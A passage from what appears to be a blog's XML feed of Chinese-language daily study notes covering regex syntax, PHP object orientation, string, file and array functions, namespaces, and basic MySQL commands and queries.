[^0-9]。\f    匹配一个换页符。等价于 \x0c 和 \cL。\n    匹配一个换行符。等价于 \x0a 和 \cJ。\r    匹配一个回车符。等价于 \x0d 和 \cM。\s    匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。\S    匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。\t    匹配一个制表符。等价于 \x09 和 \cI。\v    匹配一个垂直制表符。等价于 \x0b 和 \cK。\w    匹配包括下划线的任何单词字符。等价于’[A-Za-z0-9_]’。\W    匹配任何非单词字符包括下划线。等价于 ‘[^A-Za-z0-9_]’。\xn    匹配 n，其中 n 为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，’\x41′ 匹配 “A”。’\x041′ 则等价于 ‘\x04′ &amp; “1″。正则表达式中可以使用 ASCII 编码。.\num    匹配 num，其中 num 是一个正整数。对所获取的匹配的引用。例如，’(.)\1′ 匹配两个连续的相同字符。\n    标识一个八进制转义值或一个向后引用。如果 \n 之前至少 n 个获取的子表达式，则 n 为向后引用。否则，如果 n 为八进制数字 (0-7)，则 n 为一个八进制转义值。\nm    标 识一个八进制转义值或一个向后引用。如果 \nm 之前至少有 nm 个获得子表达式，则 nm 为向后引用。如果 \nm 之前至少有 n 个获取，则 n 为一个后跟文字 m 的向后引用。如果前面的条件都不满足，若 n 和 m 均为八进制数字 (0-7)，则 \nm 将匹配八进制转义值 nm。\nml    如果 n 为八进制数字 (0-3)，且 m 和 l 均为八进制数字 (0-7)，则匹配八进制转义值 nml。\un    匹配 n，其中 n 是一个用四个十六进制数字表示的 Unicode 字符。例如， \u00A9 匹配版权符号 (?)。例子 匹配32位md5/^[a-z0-9]&#123;32&#125;$/</code></pre>]]></content>
      
      
      <categories>
          
          <category> 附录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 附录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221114</title>
      <link href="/2022/11/14/20221114/"/>
      <url>/2022/11/14/20221114/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h4><p>类 − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。<br>对象 − 是类的实例。<br>对象的主要三个特性：<br>1.对象的行为：可以对对象施加那些操作，开灯，关灯就是行为。<br>2.对象的形态：当施加那些方法是对象如何响应，颜色，尺寸，外型。<br>3.对象的表示：对象的表示就相当于身份证，具体区分在相同的行为与状态下有什么不同。</p><h4 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h4><h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><p>成员变量 − 定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可称为对象的属性。</p><p>成员函数 − 定义在类的内部，可用于访问对象的数据。</p><p>继承 − 继承性是子类自动共享父类数据结构和方法的机制，这是类之间的一种关系。在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把这个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。</p><p>父类 − 一个类被其他类继承，可将该类称为父类，或基类，或超类。</p><p>子类 − 一个类继承其他类称为子类，也可称为派生类。</p><p>多态 − 多态性是指相同的操作或函数、过程可作用于多种类型的对象上并获得不同的结果。不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性。</p><p>重载 − 简单说，就是函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。</p><p>抽象性 − 抽象性是指将具有一致的数据结构（属性）和行为（操作）的对象抽象成类。一个类就是这样一种抽象，它反映了与应用有关的重要性质，而忽略其他一些无关内容。任何类的划分都是主观的，但必须与具体的应用有关。</p><p>封装 − 封装是指将现实世界中存在的某个客体的属性与行为绑定在一起，并放置在一个逻辑单元内。</p><p>构造函数 − 主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。</p><p>析构函数 − 析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。析构函数往往用来做”清理善后” 的工作（例如在建立对象时用new开辟了一片内存空间，应在退出前在析构函数中用delete释放）。</p><h5 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h5><pre><code>【定义函数】&lt;?php                                      //1.定义类class 类名 &#123;  /* 成员变量 */  var $var1;  var $var2 = &quot;constant string&quot;;  /* 成员函数 */  function 成员函数的函数名 ($arg1, $arg2)   &#123;      return $this-&gt;函数 = 变量             //赋值并调用函数  &#125;&#125;?&gt;$对象名 = new 类名;                         //2.创建对象echo $对象名-&gt;成员函数(&quot;传入的参数&quot;);        //3.调用成员方法大括号&#123;&#125;内可以定义变量和方法变量使用 var 来声明, 变量也可以初始化值函数定义类似 PHP 函数的定义，但函数只能通过该类及其实例化的对象访问。变量 $this 代表自身的对象【构造函数】在创建对象时， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。&lt;?phpclass 类名 &#123;   function __construct() &#123;       print &quot;构造函数&quot;;       $this-&gt;name = &quot;&quot;;   &#125;   function __destruct() &#123;       print &quot;销毁&quot; . $this-&gt;name . &quot;\n&quot;;   &#125;&#125;$obj = new 类名();?&gt;【继承】子类继承父类的特征和行为，使得子类对象具有父类的属性和方法，或子类从父类继承方法，使得子类具有父类相同的行为(父类=基类)&lt;?php // 子类扩展站点类别class 类名 &#123;           //extends继承一个类   var $category;    function setCate($par)&#123;        $this-&gt;category = $par;    &#125;    function getCate()&#123;        echo $this-&gt;category . PHP_EOL;    &#125;&#125;注意:PHP 不支持多继承【方法重写】顾名思义重新定义function【访问控制】PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有）protected(受保护的)只能被自身子父类访问private(私有的)只能被定义的类访问publice(公有的)可以在任何地方访问类属性必须被定义，var视为publice【接口】概念:指定某个类必须实现哪些方法，但不需要定义这些方法的具体内容。特性:通过interface定义，但是其中定义的所有方法都必须是公有而且要是空的。类可以实现多个接口，用逗号来分隔多个接口的名称。【常量】在类中始终保持不变的值定义为常量。在定义和使用常量的时候不需要使用 $ 符号。常量的值必须是一个定值【接口与抽象类】1. 接口（1）对接口的使用是通过关键字implements（2）接口不能定义成员变量（包括类静态变量），能定义常量（3）子类必须实现接口定义的所有方法（4）接口只能定义不能实现该方法（5）接口没有构造函数（6）接口中的方法和实现它的类默认都是public类型的2. 抽象类（1）对抽象类的使用是通过关键字extends（2）不能被实例化，可以定义子类必须实现的方法（3）子类必须定义父类中的所有抽象方法，这些方法的访问控制必须和父类中一样（或者更为宽松）（4）如一个类中有一个抽象方法，则该类必须定义为抽象类（5）抽象类可以有构造函数（6）抽象类中的方法可以使用private,protected,public来修饰。（7）一个类可以同时实现多个接口，但一个类只能继承于一个抽象类。【关键字】1.Static(1)声明类属性或方法为 static(静态)，就可以不实例化类而直接访问(2)静态属性不能通过一个类已实例化的对象来访问（但静态方法可以）。(3)由于静态方法不需要通过对象即可调用，所以伪变量 $this 在静态方法中不可用。(4)静态属性不可以由对象通过 -&gt; 操作符来访问。2.Final(1)如果父类中的方法被声明为 final，则子类无法覆盖该方法。(2)如果一个类被声明为 final，则不能被继承。【调用父类构造方法】PHP 不会在子类的构造方法中自动的调用父类的构造方法。要执行父类的构造方法，需要在子类的构造方法中调用 parent::__construct() </code></pre><h4 id="面向对象暂时先写到这里，后面有新的认识再回来更改。"><a href="#面向对象暂时先写到这里，后面有新的认识再回来更改。" class="headerlink" title="面向对象暂时先写到这里，后面有新的认识再回来更改。"></a>面向对象暂时先写到这里，后面有新的认识再回来更改。</h4><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="当废话满天飞的时候，沉默是人类最大的贡献。"><a href="#当废话满天飞的时候，沉默是人类最大的贡献。" class="headerlink" title="当废话满天飞的时候，沉默是人类最大的贡献。"></a>当废话满天飞的时候，沉默是人类最大的贡献。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221113</title>
      <link href="/2022/11/13/20221113/"/>
      <url>/2022/11/13/20221113/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="仔细收集php的常见字符操作函数"><a href="#仔细收集php的常见字符操作函数" class="headerlink" title="仔细收集php的常见字符操作函数"></a>仔细收集php的常见字符操作函数</h4><pre><code>addcslashes — 以 C 语言风格使用反斜线转义字符串中的字符addslashes — 使用反斜线引用字符串bin2hex — 函数把包含数据的二进制字符串转换为十六进制值chop — rtrim 的别名 — 删除字符串末端的空白字符（或者其他字符）chr — 返回指定的字符 — chr ( int $ascii )chunk_split — 将字符串分割成小块convert_cyr_string — 将字符由一种 Cyrillic 字符转换成另一种convert_uudecode — 解码一个 uuencode 编码的字符串convert_uuencode — 使用 uuencode 编码一个字符串count_chars — 返回字符串所用字符的信息crc32 — 计算一个字符串的 crc32 多项式crypt — 单向字符串散列echo — 输出一个或多个字符串explode — 使用一个字符串分割另一个字符串fprintf — 将格式化后的字符串写入到流get_html_translation_table — 返回使用 htmlspecialchars 和 htmlentities 后的转换表hebrev — 将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew）hebrevc — 将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew），并且转换换行符hex2bin — 转换十六进制字符串为二进制字符串html_entity_decode — Convert HTML entities to their corresponding charactershtmlentities — 将字符转换为 HTML 转义字符htmlspecialchars_decode — 将特殊的 HTML 实体转换回普通字符htmlspecialchars — 将特殊字符转换为 HTML 实体implode — 将一个一维数组的值转化为字符串join — 别名 implodelcfirst — 使一个字符串的第一个字符小写levenshtein — 计算两个字符串之间的编辑距离localeconv — Get numeric formatting informationltrim — 删除字符串开头的空白字符（或其他字符）md5_file — 计算指定文件的 MD5 散列值md5 — 计算字符串的 MD5 散列值metaphone — Calculate the metaphone key of a stringmoney_format — 将数字格式化成货币字符串nl_langinfo — Query language and locale informationnl2br — 在字符串所有新行之前插入 HTML 换行标记number_format — 以千位分隔符方式格式化一个数字ord — 转换字符串第一个字节为 0-255 之间的值parse_str — 将字符串解析成多个变量print — 输出字符串printf — 输出格式化字符串quoted_printable_decode — 将 quoted-printable 字符串转换为 8-bit 字符串quoted_printable_encode — 将 8-bit 字符串转换成 quoted-printable 字符串quotemeta — 转义元字符集rtrim — 删除字符串末端的空白字符（或者其他字符）setlocale — 设置地区信息sha1_file — 计算文件的 sha1 散列值sha1 — 计算字符串的 sha1 散列值similar_text — 计算两个字符串的相似度soundex — Calculate the soundex key of a stringsprintf — Return a formatted stringsscanf — 根据指定格式解析输入的字符str_contains — Determine if a string contains a given substringstr_ends_with — Checks if a string ends with a given substringstr_getcsv — 解析 CSV 字符串为一个数组str_ireplace — str_replace 的忽略大小写版本str_pad — 使用另一个字符串填充字符串为指定长度str_repeat — 重复一个字符串str_replace — 子字符串替换str_rot13 — 对字符串执行 ROT13 转换str_shuffle — 随机打乱一个字符串str_split — 将字符串转换为数组str_starts_with — Checks if a string starts with a given substringstr_word_count — 返回字符串中单词的使用情况strcasecmp — 二进制安全比较字符串（不区分大小写）strchr — 别名 strstrstrcmp — 二进制安全字符串比较strcoll — 基于区域设置的字符串比较strcspn — 获取不匹配遮罩的起始子字符串的长度strip_tags — 从字符串中去除 HTML 和 PHP 标记stripcslashes — 反引用一个使用 addcslashes 转义的字符串stripos — 查找字符串首次出现的位置（不区分大小写）stripslashes — 反引用一个引用字符串stristr — strstr 函数的忽略大小写版本strlen — 获取字符串长度strnatcasecmp — 使用“自然顺序”算法比较字符串（不区分大小写）strnatcmp — 使用自然排序算法比较字符串strncasecmp — 二进制安全比较字符串开头的若干个字符（不区分大小写）strncmp — 二进制安全比较字符串开头的若干个字符strpbrk — 在字符串中查找一组字符的任何一个字符strpos — 查找字符串首次出现的位置strrchr — 查找指定字符在字符串中的最后一次出现strrev — 反转字符串strripos — 计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写）strrpos — 计算指定字符串在目标字符串中最后一次出现的位置strspn — 计算字符串中全部字符都存在于指定字符集合中的第一段子串的长度。strstr — 查找字符串的首次出现strtok — 标记分割字符串strtolower — 将字符串转化为小写strtoupper — 将字符串转化为大写strtr — 转换指定字符substr_compare — 二进制安全比较字符串（从偏移位置比较指定长度）substr_count — 计算字串出现的次数substr_replace — 替换字符串的子串substr — 返回字符串的子串trim — 去除字符串首尾处的空白字符（或者其他字符）ucfirst — 将字符串的首字母转换为大写ucwords — 将字符串中每个单词的首字母转换为大写vfprintf — 将格式化字符串写入流vprintf — 输出格式化字符串vsprintf — 返回格式化字符串wordwrap — 打断字符串为指定数量的字串is_array 判断是否为数组count 数组的元素数目array_search — 在数组中搜索给定的值，如果成功则返回相应的键名array_key_exists()在给定的 key 存在于数组中时返回 TRUEarray_unshift()  将传入的单元插入到 array 数组的开头。注意单元是作为整体被插入的，因此传入单元将保持同样的顺序。所有的数值键名将修改为从零开始重新计数，所有的文字键名保持不变array_shift()  将array 的第一个单元移出并作为结果返回，将 array 的长度减一并将所有其它单元向前移动一位。所有的数字键名将改为从零开始计数，文字键名将不变。array_unique()  接受 array 作为输入并返回没有重复值的新数组。注意键名保留不变。 array_unique()  先将值作为字符串排序，然后对每个值只保留第一个遇到的键名，接着忽略所有后面的键名。这并不意味着在未排序的 array 中同一个值的第一个出现的键名会被保留。 in_array — 检查数组中是否存在某个值  如果找到指定的值则返回 TRUE，否则返回 FALSE 。in_array()是区分大小写的。PHP_EOL 为换行符</code></pre><p>部分实例</p><pre><code>$a=&#39;123456&#39;;echo $str.&quot; 一共有 &quot;.strlen($a).&quot;字符&quot;;//去掉空格echo trim($str);echo $str1;//查找字符串 返回位置echo strpos($str,&#39;暗月&#39;);//截取字符串echo substr($str,strpos($str,&#39;暗月&#39;),strpos($str,&#39;培训&#39;));//md5  加密echo md5($a);//通过下标 取字符的值echo $a[0];//字符串替换函数$a1=str_replace(&#39;1&#39;,&#39;0&#39;,$a);echo $a1;</code></pre><h4 id="具体的使用方法请查看手册"><a href="#具体的使用方法请查看手册" class="headerlink" title="具体的使用方法请查看手册"></a>具体的使用方法请查看手册</h4><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="最后，分享一句圆桌派的话：“你可以是孤岛，也可-以连成一片。”"><a href="#最后，分享一句圆桌派的话：“你可以是孤岛，也可-以连成一片。”" class="headerlink" title="最后，分享一句圆桌派的话：“你可以是孤岛，也可 以连成一片。”"></a>最后，分享一句圆桌派的话：“你可以是孤岛，也可 以连成一片。”</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221112</title>
      <link href="/2022/11/12/20221112/"/>
      <url>/2022/11/12/20221112/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="PHP超级全局变量"><a href="#PHP超级全局变量" class="headerlink" title="PHP超级全局变量"></a>PHP超级全局变量</h4><p>PHP超级全局变量列表：<br>$GLOBALS　　一个包含了全部变量的全局组合数组。变量的名字就是数组的键。<br>$_SERVER　　一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组<br>$_REQUEST　　用于收集HTML表单提交的数据。<br>它可以获取 cookie  get  post<br>$_POST　　应用于收集表单数据，在HTML form标签的指定该属性：”method=”post”。<br>$_GET　　应用于收集表单数据，在HTML form标签的指定该属性：”method=”get”。<br>Array []<br>$_FILES　　<br>$_ENV　　<br>$_COOKIE　　<br>$_SESSION</p><h4 id="PHP-Include-文件"><a href="#PHP-Include-文件" class="headerlink" title="PHP Include 文件"></a>PHP Include 文件</h4><p>服务器端包含用于创建可在多个页面重复使用的函数、页眉、页脚或元素。</p><pre><code>将 PHP 文件的内容插入另一个 PHP 文件:include &#39;filename&#39;;require &#39;filename&#39;;错误处理方面:require 会生成致命错误（E_COMPILE_ERROR）并停止脚本include 只生成警告（E_WARNING），但脚本会继续</code></pre><h4 id="PHP-文件处理"><a href="#PHP-文件处理" class="headerlink" title="PHP 文件处理"></a>PHP 文件处理</h4><p>操作文件:<br>readfile() 函数读取文件，并把它写入输出缓冲。<br>文件打开/读取/关闭:<br>fopen(“AAA.txt”,”/r”)函数的第一个参数包含被打开的文件名，第二个参数规定打开文件的模式。</p><p>打开模式详解:<br>r:打开只读文件，指针在文件开头<br>w:只写文件，如果不存在就删除或创建，指针在文件开头<br>a:只写文件，保留数据，指针在结尾，如果文件不存在就创建新文件<br>x:创建新文件为只写，如果文件存在就返回false和错误<br>r+:打开文件为读/写，指针在开头<br>w+:打开文件为读/写，如果不存在就创建或删除，指针在开头<br>a+:打开文件为读/写，保留数据，指针在结尾，如果不存在就创建新文件<br>x+:创建文件为读/写，如果文件已存在就返回false和错误</p><p>fread($文件名,filesize(“AAA.txt”));<br>第一个参数包含待读取文件的文件名，第二个参数规定待读取的最大字节数</p><p>fclose($文件名);<br>关闭打开的文件，节约服务器资源</p><p>fgets($文件名);<br>从文件读取单行，调用后，文件指针会移动到下一行。</p><p>feof($myfile);<br>检查是否已到达文件末尾(EOF)，常用于遍历未知长度的数据</p><p>fgetc($myfile);<br>从文件中读取单个字符，调用后，文件指针会移动到下一个字符。</p><p>fopen(“文件名”, “w”)；<br>如果用来打开不存在的文件，此函数会创建文件，假定文件被打开为写入（w）或增加（a）。</p><p>fwrite($文件名,要发送的字符串);<br>写入文件,会发生覆盖原数据</p><h4 id="文件的-复制-删除-重名"><a href="#文件的-复制-删除-重名" class="headerlink" title="文件的 复制 删除 重名"></a>文件的 复制 删除 重名</h4><p>php文件重命名：函数rename()。<br>php文件复制：函数copy();<br>php文件删除：函数unlink();</p><h4 id="获取文件属性"><a href="#获取文件属性" class="headerlink" title="获取文件属性"></a>获取文件属性</h4><pre><code>file_exists(string $filename)是否存在,返回false或trueis_file() 是否为文件,返回false或truefilesize() 文件大小,返回false或trueis_readable() 文件名是否可读,返回false或trueis_writable() 文件名是否可改,返回false或trueis_executable() 文件名是否可执行,返回false或truefilectime() 文件创建时间，返回UNX时间戳filemtime() 文件修改时间，返回UNX时间戳fileatime() 上次访问时间，返回UNX时间戳stat() 获取大部分属性值，返回包含文件信息的数组</code></pre><h4 id="PHP目录操作"><a href="#PHP目录操作" class="headerlink" title="PHP目录操作"></a>PHP目录操作</h4><p>新建目录：mkdir(路径，权限，递归创建)<br>删除目录：rmdir()<br>移动（改名）：rename()<br>获取目录内容：<br>//打开目录<br>目录句柄 = opendir()<br>//读取目录<br>文件名 = readdir(目录句柄)<br>依次读取文件名，同时向下移动文件句柄指针，读取不到则返回false<br>//关闭目录<br>closedir()</p><p>注:前目录. 上级目录用..</p><h4 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h4><p>定义：人为的将内存进行分隔<br>作用：让不同内存区域的同名结构共存<br>目的：解决重名结构问题<br>空间元素：函数，常量，类，不包括变量！！!<br>语法:<br>namespace 空间名<br>namespace 空间名\子空间</p><p>命名空间访问(url)<br>1.定名称访问：直接访问空间元素的名字（只访问自己命名空间的元素）<br>2.名称访问：使用自己当前的子空间名字+ \ + 元素名字<br>3.访问：\ + 全局空间 + \  +  元素名字<br>注：任何空间元素访问，只针对函数，类，常量，不包括变量！！!</p><p>全局空间(C盘)<br>如果定义了命名空间，非限定名称的寻找系统常量的方式：<br>首先,自己的空间内找<br>然后,果找不到元素<br>系统常量–&gt;进入全局空间寻找<br>系统类–&gt;不会自动进入全局空间寻找，而是会报错</p><pre><code>命名空间的引入1.空间引入方式：use关键字    (1)类：use 空间名\类名    (2)数：use function 空间名\函数名    (3)量：use const 空间名\常量名2.当引入元素时重名，通过 as 来起别名    use 空间名\类名 as 别名3.引入多个元素    use 空间名\&#123;        类名，        function 函数名，        const 常量    &#125;       4. 引入空间    use 空间名</code></pre><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="此爱隔山海，山海不可平。"><a href="#此爱隔山海，山海不可平。" class="headerlink" title="此爱隔山海，山海不可平。"></a>此爱隔山海，山海不可平。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221111</title>
      <link href="/2022/11/11/20221111/"/>
      <url>/2022/11/11/20221111/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><pre><code>文件1function add()&#123;    echo &#39;执行&#39;;&#125;add增加，del删除，update更改，select查询文件2include (&#39;文件1.php&#39;);          //调用文件add();                         //调用函数include与require区别include在没有这个文件时报错并执行，但是require报错但是不执行include_once与require_once区别可以重复调用文件，区别同上</code></pre><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><pre><code>索引数组:$arr=[1,2,3,4,5];var_dump($arr);或$arr=array(1,2,3,4,5);var_dump($arr);关联数组:$arr=[    &#39;A&#39;=&gt;&#39;a&#39;,    &#39;B&#39;=&gt;&#39;b&#39;;];var_dump($arr);二维(多维)数组:$arr=[    &#39;A&#39;=&gt;[        &#39;a&#39;,        &#39;b&#39;,        &#39;c&#39;,    ]];var_dump($arr);</code></pre><h5 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h5><p>增加:直接声明$arr[位置]=’内容’;<br>删除:unset($arr[位置]);<br>修改:重新定义<br>对于多维数组要var_dump($arr[第一层位置][第二层位置]…….);<br>获取循环次数:echo count($arr);</p><pre><code>遍历foreach ($arr as $key =&gt; $value) &#123;    echo $key.&#39;&lt;br/&gt;&#39;;&#125;list($a , $b , $c , $d , $e) = $arr;echo $a,$b,$c,$d;一一赋值，多出来的跳过，只对有索引的有效while (list($key , $val) = each($arr)) &#123;    echo $key.&#39;--&#39;.$val.&#39;&lt;br/&gt;&#39;;&#125;排序sort() - 对数组进行升序排列rsort() - 对数组进行降序排列asort() - 根据关联数组的值，对数组进行升序排列ksort() - 根据关联数组的键，对数组进行升序排列arsort() - 根据关联数组的值，对数组进行降序排列krsort() - 根据关联数组的键，对数组进行降序排列数组的合拼$array1 =array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);$array2 = array(&#39;a1&#39;=&gt;&#39;php&#39;,&#39;a2&#39;=&gt;&#39;python&#39;,&#39;a3&#39;=&gt;&#39;java&#39;);$array3 = array_merge($array1,$array2);添加到指定位置array_splice(数组，位置，删除几个，增加元素）</code></pre><h4 id="超全局数组"><a href="#超全局数组" class="headerlink" title="超全局数组"></a>超全局数组</h4><p>配合html前端页面method=’get/post’<br>var_dump($_GET);获取GET的参(显示内容在URL)<br>var_dump($_POST);获取POST的参(不显示)<br>var_dump($_REQUEST);都可以获取<br>前端name所设置的会把参数传到后端<br>name=’username’<br>$username=$_GET[‘username’];</p><h4 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h4><pre><code>notice注意                   //后续代码会继续执行warning警告                  //后续代码会继续执行fatal error致命错误          //后续代码不会继续执行@可以消除警报(除了fatal error)在ini配置文件里display_errors:On可以取消报错(所有)在ini配置文件里error_log找错误日志</code></pre><h4 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a>日期函数</h4><p>时间戳:时间戳是从1970年1月1日（UTC/GMT的午夜）开始所经过的秒数，不考虑闰秒。<br>配置文件可改时区，不详细讲</p><h4 id="数据库简介-dos操作"><a href="#数据库简介-dos操作" class="headerlink" title="数据库简介(dos操作)"></a>数据库简介(dos操作)</h4><pre><code>对数据库的解释:数据库相当于文件夹，表相当于文件，字段就是内容。注释符:#    &quot;--  &quot;    /* */&lt;不是内部命令就更改环境变量&gt;【库操作】连接数据库:mysql -uroot -p查库:show databases;建库creat database 库名;删库drop database 库名;退出mysql &gt; exit;mysql &gt; quit;mysql &gt; \q;重命名数据库RENAME database olddbname TO newdbname【表操作】进库:use 库名;建表:creat table 表名(id int,字段名 数据类型(长度) , 字段名 数据类型(位数));建表命令:show creat table 表名;改表名:alter table 原表名 rename 新名字查表:show tables;select * from table_name删表:drop table 表名;查表结构:desc 表名;                      //字段类型，主键，是否为空等属性，但不显示外键【字段操作】建表字段:alter table 表名 add 字段名 (字段类型)改表字段:alter table 表名 change 原来的字段名 现在的字段名 数据类型(位数);改表字段值:alter table 表名 modify 字段名 修改后的值删表字段:alter table 表名 drop 字段名更改表的存储引擎:alter table 表名 engine=存储引擎名;给所有字段增加数据:insert into users (字段名1,字段名2,字段名3)values(值1,值2,值3);【插入顺序】first    alter table 表名 add 字段(字段类型) firstafter    alter table 表名 add 字段名(字段类型) after (在谁后面)【其它命令】显示系统特定资源的信息show status;                   //例如，正在运行的线程数量。</code></pre><h4 id="mysql数据类型"><a href="#mysql数据类型" class="headerlink" title="mysql数据类型"></a>mysql数据类型</h4><p>整形:<br>int4字节，bigint8字节<br>浮点型:<br>float(m,d)<br>double(m,d)<br>decimal(m,d)<br>字符型:<br>char定长字符串(常用于32位md5密码)<br>varchar变长字符串(常用于用户名)<br>时间型:<br>4字节，年月日格式<br>auto_increment:<br>自动增加，只用于整形，priimary&emsp;key设置起始值(默认为1)<br><a href="https://www.cnblogs.com/-xlp/p/8617760.html">总结内容</a></p><h5 id="以上内容皆可使用phpMyAdmin和NavicatPremium更改"><a href="#以上内容皆可使用phpMyAdmin和NavicatPremium更改" class="headerlink" title="以上内容皆可使用phpMyAdmin和NavicatPremium更改"></a>以上内容皆可使用phpMyAdmin和NavicatPremium更改</h5><h4 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h4><pre><code>普通索引:alter table 表名 add index(字段);唯一索引:alter table 表名 add unique(字段);主键索引:alter table 表名 add primary key(字段);全文索引:alter table 表名 add fulltext(字段);显示索引:show index from 字段名</code></pre><p><a href="https://blog.csdn.net/qq_35190492/article/details/109257302?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166808686716782428672275%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166808686716782428672275&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-109257302-null-null.142%5Ev63%5Ejs_top,201%5Ev3%5Econtrol,213%5Ev2%5Et3_esquery_v2&utm_term=mysql%E7%B4%A2%E5%BC%95&spm=1018.2226.3001.4187">使用及区别</a></p><h4 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h4><pre><code>select选择时如果要限制条件就在后面加上where和条件where age&lt;&gt;50; == where age!50                     //取非age in(18,16,17);                                  //固定查询的值address like &#39;Ax&#39;;                                 //模糊查询A开头的address like &#39;xAx&#39;;                                //模糊查询含A的select * from 表名 order by 列名 desc;             //降序显示，默认为升序(asc)select * from 表名 limit 5,5;                      //从第五个值开始往下取5个值select * from 表名 group by 列名;                  //分组(只保留一个，去重)select count(*) from 表名;                         //显示该列有几个数据select 列名 as 别名 from 表名;                     //给该列起别名注意:and优先级高于or，因此先计算and表达式再运算or表达式聚合查询:count()返回行数sum()返回某列值的和avg()返回某列平均值max()返回某列最大值min()返回某列最小值分组查询:select * from 表名 group by 字段名;select * from 表名 limit 开始行数,结束行数;select * from 表名 as 重命名;mysql子查询:类似于嵌套循环，将内层的结果传递到外层进行下一步操作大致有:where,from,exists三个联合查询(两个表的查询):原理——————取得两个结果集的并集union默认选取不同的值。如果允许重复的值，请使用union all(不会去掉结果中的重复行)union all 查询全部而且不会消除重复的行</code></pre><h4 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a>查询数据库</h4><pre><code>内联查询:select 列名1 from 表名1 inner join 表名2 on 条件;左连接查询(以左边为基准):select 列名1 from 表名1 left join 表名2 on 条件;右链接查询(左边没有的不会显示):select 列名1 from 表名1 right join 表名2 on 条件;嵌套查询:不建议，太慢</code></pre><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="双十一被学校关在宿舍饲养-不用走到哪都吃狗粮真是太开心了-dog"><a href="#双十一被学校关在宿舍饲养-不用走到哪都吃狗粮真是太开心了-dog" class="headerlink" title="双十一被学校关在宿舍饲养,不用走到哪都吃狗粮真是太开心了(dog)"></a>双十一被学校关在宿舍饲养,不用走到哪都吃狗粮真是太开心了(dog)</h5>]]></content>
      
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221110</title>
      <link href="/2022/11/10/20221110/"/>
      <url>/2022/11/10/20221110/</url>
      
